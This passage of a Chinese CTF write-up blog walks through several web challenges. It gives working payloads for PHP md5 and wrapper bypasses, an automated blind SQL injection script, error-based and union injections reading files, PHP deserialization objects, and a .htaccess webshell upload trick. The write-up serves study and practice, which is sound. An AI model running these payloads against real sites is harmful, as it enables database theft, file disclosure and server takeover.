&quot;flag.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这一有一些不同的是md5比较使用了<code>===</code>不仅比较类型还比较值。但是md5有一个：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5([1,2,3]) == md5([4,5,6]) == NULL</span><br></pre></td></tr></table></figure>\n\n<p>所以传入两个数组，又能保证两个变量不相等，md5加密有都是NULL且类型是数组类型，注意数组里的值还是不可以一样的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"ZJCTF-2019-NiZhuanSiWei\"><a href=\"#ZJCTF-2019-NiZhuanSiWei\" class=\"headerlink\" title=\"[ZJCTF 2019]NiZhuanSiWei\"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>源码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$text = $_GET[&quot;text&quot;];</span><br><span class=\"line\">$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">$password = $_GET[&quot;password&quot;];</span><br><span class=\"line\">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class=\"line\">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class=\"line\">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class=\"line\">        echo &quot;Not now!&quot;;</span><br><span class=\"line\">        exit(); </span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        include($file);  //useless.php</span><br><span class=\"line\">        $password = unserialize($password);</span><br><span class=\"line\">        echo $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>先来一段<a href=\"https://segmentfault.com/a/1190000018991087\">PHP伪协议总结</a>，这题的第一步是判断传入text参数并读取内容，判断内容为<strong>welcome to the zjctf</strong>，使用<code>data://</code>伪协议。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure>\n\n<p>接下来是文件包含，有了提示<code>useless.php</code>肯定要读一读看看，使用<code>php://filter</code>伪协议。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>\n\n<p>得到的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\"></span><br><span class=\"line\">class Flag&#123;  //flag.php  </span><br><span class=\"line\">    public $file;  </span><br><span class=\"line\">    public function __tostring()&#123;  </span><br><span class=\"line\">        if(isset($this-&gt;file))&#123;  </span><br><span class=\"line\">            echo file_get_contents($this-&gt;file); </span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">?&gt;  </span><br></pre></td></tr></table></figure>\n\n<p>并且文件包含下面有一个反序列化，又看到了<code>__tostring</code>函数，<strong>当一个对象被当作字符串对待的时候，会触发这个魔术方法</strong>。我构造的对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">class Flag&#123;  </span><br><span class=\"line\">    public $file=&quot;flag.php&quot;;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$f = new Flag();</span><br><span class=\"line\">echo serialize($f);</span><br><span class=\"line\"></span><br><span class=\"line\">//O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在传入对象之前当然要把读取文件流改为正常包含文件了。最终payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"CISCN2019-华北赛区-Day2-Web1-Hack-World\"><a href=\"#CISCN2019-华北赛区-Day2-Web1-Hack-World\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day2 Web1]Hack World\"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307171921.png\"></p>\n<p>很明显的sql注入，随便尝试一些语句有</p>\n<blockquote>\n<p>1    &gt;&gt;    Hello, glzjin wants a girlfriend.</p>\n<p>2    &gt;&gt;    Do you want to be my girlfriend?</p>\n<p>3之后都是    &gt;&gt;    Error Occured When Fetch Result.</p>\n</blockquote>\n<p>输入一个单引号<code>1&#39;</code>出现了<code>bool(false)</code>，是一个布尔类型返回，就很有可能是盲注之类的。测试的时候还发现空格被过滤了，空格被过滤可以尝试使用TAB制表符代替。</p>\n<p>题目中也有提示</p>\n<blockquote>\n<h3 id=\"All-You-Want-Is-In-Table-‘flag’-and-the-column-is-‘flag’\"><a href=\"#All-You-Want-Is-In-Table-‘flag’-and-the-column-is-‘flag’\" class=\"headerlink\" title=\"All You Want Is In Table ‘flag’ and the column is ‘flag’\"></a>All You Want Is In Table ‘flag’ and the column is ‘flag’</h3></blockquote>\n<p>说明flag在flag表的flag字段中。以下是一个布尔盲注的脚本，思路就是查询flag的值使用<code>substr</code>函数每次截取一个字符，获得其<code>ascii</code>值再使用二分法确定具体的值，最后拼接输出。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://26670c55-697e-4520-ae0a-bd23a786cd72.node3.buuoj.cn/&#x27;</span></span><br><span class=\"line\">result = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">50</span>):</span><br><span class=\"line\">\thigh = <span class=\"number\">127</span></span><br><span class=\"line\">\tlow = <span class=\"number\">32</span></span><br><span class=\"line\">\tmid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> high&gt;low:</span><br><span class=\"line\">\t\tpayload = <span class=\"string\">&quot;if(ascii(substr((select\tflag\tfrom\tflag),%d,1))&gt;%d,1,2)&quot;</span> % (x, mid)</span><br><span class=\"line\">\t\tdata = &#123;</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;id&quot;</span>:payload</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ttime.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\">\t\tresponse = requests.post(url, data = data)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27;Hello&#x27;</span> <span class=\"keyword\">in</span> response.text:</span><br><span class=\"line\">\t\t\tlow=mid+<span class=\"number\">1</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\thigh = mid</span><br><span class=\"line\">\t\tmid = (low+high)/<span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tresult += <span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(mid))</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(result)</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;929c8993-2d85-4fbf-8e48-7c457551105e&#125;</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"极客大挑战-2019-HardSQL\"><a href=\"#极客大挑战-2019-HardSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]HardSQL\"></a>[极客大挑战 2019]HardSQL</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307173126.png\"></p>\n<p>还是sql注入题。尝试在输入框里输入<code>#</code>、<code>--+</code>时被拦下了，但是在url中使用%23通过了。尝试了union但是被过滤了，使用双写也不通过，和这道题同类型的题前面有Baby SQL、Easy SQL，考点还剩下的有盲注、报错注入、堆叠注入。尝试报错注入可以使用，我参考的<a href=\"https://www.cnblogs.com/wocalieshenmegui/p/5917967.html\">十种MySQL报错注入</a>。还需要注意空格是会被拦下的，url编码也不能通过，所以在语句中的表名需要使用<code>()</code>隔开，具体payload如下：</p>\n<ol>\n<li>爆表</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"keyword\">or</span>(extractvalue(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span>(group_concat(table_name))<span class=\"keyword\">from</span>(information_schema.tables)<span class=\"keyword\">where</span>(table_schema)<span class=\"keyword\">like</span>(database())),<span class=\"number\">0x7e</span>)))<span class=\"operator\">%</span><span class=\"number\">23</span><span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>当前表名是：H4rDsq1</p>\n<ol start=\"2\">\n<li>爆字段</li>\n</ol>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"keyword\">or</span>(extractvalue(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span>(group_concat(column_name))<span class=\"keyword\">from</span>(information_schema.columns)<span class=\"keyword\">where</span>(table_name)<span class=\"keyword\">like</span>(<span class=\"string\">&#x27;H4rDsq1&#x27;</span>)),<span class=\"number\">0x7e</span>)))<span class=\"operator\">%</span><span class=\"number\">23</span><span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>当前表的字段有：id,username,password</p>\n<ol>\n<li>出数据</li>\n</ol>\n<p>如果使用正常的查询语句会因为flag的长度太长，页面中的回显长度不能显示全，但是可以使用<code>left</code>和<code>right</code>函数：</p>\n<blockquote>\n<p>语法：LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH)</p>\n</blockquote>\n<p>这两个函数会用到选取的长度，如果想要拼成一个完整的flag，可以先用length查看总长度，计算以后拼一下</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"keyword\">or</span>(extractvalue(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span>(<span class=\"keyword\">left</span>(password,<span class=\"number\">35</span>))<span class=\"keyword\">from</span>(H4rDsq1)),<span class=\"number\">0x7e</span>)))<span class=\"operator\">%</span><span class=\"number\">23</span><span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>flag{112bb5db-17a4-47e2-97b4-19</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username<span class=\"operator\">=</span>admin<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"keyword\">or</span>(extractvalue(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span>(<span class=\"keyword\">right</span>(password,<span class=\"number\">11</span>))<span class=\"keyword\">from</span>(H4rDsq1)),<span class=\"number\">0x7e</span>)))<span class=\"operator\">%</span><span class=\"number\">23</span><span class=\"operator\">&amp;</span>password<span class=\"operator\">=</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>dc295a017f}</p>\n<hr>\n<h1 id=\"网鼎杯-2018-Fakebook\"><a href=\"#网鼎杯-2018-Fakebook\" class=\"headerlink\" title=\"[网鼎杯 2018]Fakebook\"></a>[网鼎杯 2018]Fakebook</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307174819.png\"></p>\n<p>是一个展示自己博客网址的列表，先随便注册一个</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307175313.png\"></p>\n<p>我填的是baidu的网址23333。这时的url是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://2cefe2a5-4e68-44ce-870c-3628c2500cd3.node3.buuoj.cn/view.php?no=1</span><br></pre></td></tr></table></figure>\n\n<p>看到了no=1，应该想到了sql注入，我没有试出什么名堂，但是在网上找到了一个这道题的非预期解：[<a href=\"https://www.cnblogs.com/kevinbruce656/p/12643338.html\">网鼎杯2018]fakebook题解</a>，使用了<code>load_file</code>函数直接读取了flag文件。同样是空格被过滤，但是可以使用<code>/**/</code>绕过。</p>\n<h2 id=\"非预期解\"><a href=\"#非预期解\" class=\"headerlink\" title=\"非预期解\"></a>非预期解</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>\n\n<p>先使用上面的语句查看回显点。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210307180356.png\"></p>\n<p>找的了位置2的回显点，可以把函数替换在2的位置上。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>\n\n<p>参考师傅的博客中是使用了盲注获得flag的，其实执行以后使用页面的选取工具选取回显的标签块，可以在注释里找的到🤣</p>\n<h2 id=\"预期解\"><a href=\"#预期解\" class=\"headerlink\" title=\"预期解\"></a>预期解</h2><p>正常的sql注入一套查询，同样是使用<code>/**/</code>绕过空格过滤。</p>\n<p>爆表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?no=-1%20union/***/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()%23</span><br></pre></td></tr></table></figure>\n\n<p>爆字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?no=-1 union/***/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27; %23</span><br></pre></td></tr></table></figure>\n\n<p>出数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?no=-1 union/***/select 1,group_concat(no,username,passwd,data),3,4 from users</span><br></pre></td></tr></table></figure>\n\n<p>查询的结果是一大串字符串，但是在结尾一个PHP的序列化对象：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;guobang&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:20:&quot;http://www.baidu.com&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>说明网站是使用反序列化获取对应栏的数据，下面有一个iframe的标签，根据提示<strong>the contents of his/her blog</strong>，得知我们提供的网址会在这里显示，正好有一个php伪协议file://可以读取本地文件，思路就是：<strong>使用伪协议读取flag作为blog网站回显在iframe的标签中</strong>，所以构造一个序列化对象。 </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span> = <span class=\"string\">&quot;guobang&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$age</span> = <span class=\"number\">18</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$blog</span> = <span class=\"string\">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$s</span> = <span class=\"keyword\">new</span> UserInfo();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize(<span class=\"variable\">$s</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;guobang&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>最终payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?no=-1%20union/***/select%201,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;guobang&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27; from%20users</span><br></pre></td></tr></table></figure>\n\n<p>在iframe里面找，是一个data:text/html的数据格式，base64加密的噢。</p>\n<hr>\n<h1 id=\"网鼎杯-2020-青龙组-AreUSerialz\"><a href=\"#网鼎杯-2020-青龙组-AreUSerialz\" class=\"headerlink\" title=\"[网鼎杯 2020 青龙组]AreUSerialz\"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>部分图</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308102316.png\"></p>\n<p>最下面有对于payload的限制：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">is_valid</span>(<span class=\"params\"><span class=\"variable\">$s</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; strlen(<span class=\"variable\">$s</span>); <span class=\"variable\">$i</span>++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!(ord(<span class=\"variable\">$s</span>[<span class=\"variable\">$i</span>]) &gt;= <span class=\"number\">32</span> &amp;&amp; ord(<span class=\"variable\">$s</span>[<span class=\"variable\">$i</span>]) &lt;= <span class=\"number\">125</span>))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>&#123;<span class=\"string\">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$str</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;str&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(is_valid(<span class=\"variable\">$str</span>)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$obj</span> = unserialize(<span class=\"variable\">$str</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要payload中的字符ascii码值<code>大于</code>32<code>小于</code>125。注意到最后有一个<code>unserialize</code>函数，判断这道题考点是反序列化。接下来分析源码：</p>\n<ul>\n<li><code>process()</code>函数判断op的值，如果是<code>1</code>就写入文件，如果是<code>2</code>就读取文件。代码开头包含了<code>flag.php</code>文件，所以推测需要使用2操作数读取flag.php文件。</li>\n<li><code>write()</code>把对象中的<code>$content</code>属性值写入到<code>$filename</code>文件中，如果长度大于100会被拦下。</li>\n<li><code>read()</code>使用<strong>file_get_contents()<strong>函数读取文件。</strong>正是我们想要的</strong>。</li>\n<li><code>output()</code>输出内容。</li>\n<li><code>__destruct()</code>对象销毁时会执行的函数，需要注意的是<strong>if</strong>判断里的<code>$this-&gt;op === &quot;2&quot;</code>是强比较，并且会修改op的值为1（写文件），因为**”2”<strong>是一个字符串类型的如果传入</strong>整型的2**即可绕过。</li>\n</ul>\n<p>所以我们构造一个对象<strong>op</strong>为2，<strong>filename</strong>为flag.php即可，读文件的时候肯定不是</p>\n<p>接下来是反序列化时会遇到的问题，因为对象中属性的修饰是<code>protected</code>，序列化时需要保证一致的。</p>\n<p>先给出自己创建的对象源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FileHandler</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span>  <span class=\"variable\">$op</span>=<span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span>  <span class=\"variable\">$filename</span>=<span class=\"string\">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span>  <span class=\"variable\">$content</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"keyword\">new</span> FileHandler();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize(<span class=\"variable\">$c</span>);</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>PHP7.1以上版本对属性类型不敏感、用public绕过:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行以后可以在网页注释中找到文件。绝对路径读取也可以，我第一次使用php://filter读再去解码也成功了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>序列化字符串中s替换为S，支持字符串用16进制，</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;S:11:&quot;\\00*\\00filename&quot;;S:22:&quot;/var/www/html/flag.php&quot;;S:10:&quot;\\00*\\00content&quot;;N;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>思路：<a href=\"https://blog.csdn.net/Oavinci/article/details/106998738\">https://blog.csdn.net/Oavinci/article/details/106998738</a></p>\n<hr>\n<h1 id=\"MRCTF2020-你传你🐎呢\"><a href=\"#MRCTF2020-你传你🐎呢\" class=\"headerlink\" title=\"[MRCTF2020]你传你🐎呢\"></a>[MRCTF2020]你传你🐎呢</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308104930.png\"></p>\n<p>测试后缀，php、phtml都被过滤了，htaccess可以，先传上特供的<code>.htaccess</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105247.png\"></p>\n<p>传图片马，我一直用的是GIF马，几次尝试都没通过，后来修改了<code>Content-Type: image/jpeg</code>可以了，说明Content-Type是GIF还不行，接下来直接传图片码</p>\n<p><img 